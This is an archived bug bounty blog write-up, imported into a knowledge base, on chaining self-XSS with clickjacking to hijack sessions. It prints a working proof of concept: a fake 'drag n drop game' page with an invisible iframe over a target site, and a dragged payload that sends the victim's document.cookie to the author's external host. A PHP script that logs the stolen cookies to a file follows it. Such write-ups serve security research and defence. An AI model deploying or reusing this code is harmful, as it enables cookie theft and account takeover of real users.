---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-09-18_chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-l.md
original_filename: 2017-09-18_chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-l.md
title: Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users
  like a boss)
category: documents
detected_topics:
- clickjacking
- xss
- command-injection
- csrf
tags:
- imported
- documents
- clickjacking
- xss
- command-injection
- csrf
language: en
raw_sha256: a1cf4ddbc3fb00297000cb6da2431bae167e8db1f59f384b0c62b8aa95a689a3
text_sha256: 424142fcb983451c5600383aefef67e740ed9ca746ff2ce0ef54387f8573ad23
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-09-18_chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-l.md
- Source Type: markdown
- Detected Topics: clickjacking, xss, command-injection, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `a1cf4ddbc3fb00297000cb6da2431bae167e8db1f59f384b0c62b8aa95a689a3`
- Text SHA256: `424142fcb983451c5600383aefef67e740ed9ca746ff2ce0ef54387f8573ad23`


## Content

---
title: "Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss)"
url: "https://medium.com/bugbountywriteup/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14"
authors: ["Armaan Pathan (@armaancrockroax)"]
bugs: ["Self-XSS", "Clickjacking"]
publication_date: "2017-09-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6102
scraped_via: "browseros"
---

# Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss)

Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss)
Armaan Pathan
Follow
2 min read
·
Sep 18, 2017

176

1

while i was testing the web application i have found self xss. which has no impact. but i wanted to exploit this vulnerability, so have started thinking that how can i exploit this self xss, and then i have decided to chain the self xss with some other vulnerability.

so again a have stared looking for CSRF attack, but i dint get CSRF on the vulnerable page.

But i had noticed that application was not using the x-frame header. so thought lets check for click jacking. !
and yeah ! application was vulnerable with click jacking.

so have decided to chain Self xss with click jacking.

Here is the Click jacking which is chained with self xss which grabs victim’s cookies.

<html>
<head><title>Poc</title></head>
<body bgcolor=”gray”>
<h1 align=”center”>DRAG N DROP GAME</h1>
<br><br><br>
<img src=”https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSi0I3s6J4VZohcVZbzUzJ-g-y722W8jqyo4g1lc0HhM9SH9WN9" draggable=true id=drag ondragstart=”event.dataTransfer.setData(‘text/plain’,’<script>location=`http://armaanpathan.pe.hu/cookies.php?cookie=`+btoa(document.cookie)</script>')">

<br><br><br>
<style type=”text/css”>
iframe {
width: 800px;
height: 650px;
position: absolute;
top: 2; right: 10;
filter: alpha(opacity=50);
opacity: 0.00 ;

</style>
<style type=”text/css”>
h2{
position: absolute;
top: 420; right: 30;
}
</style>
<iframe src=”www.victim.com"></iframe>
<H2>DRAG THE IMAGE HERE</h2>
</html>

here is the code which saves the grabbed cookies in txt file

Get Armaan Pathan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<?php

$c=$_GET[‘cookie’];
file_put_contents(“cookies.txt”,$c . “\n\n”,FILE_APPEND);

?>

Press enter or click to view image in full size
Press enter or click to view image in full size

and yeah i was able to hijack any user’s sessions.

Here is the PoC video

Spacial thanks to Rahul Maini . for helping me. :)

thanks for reading. :)
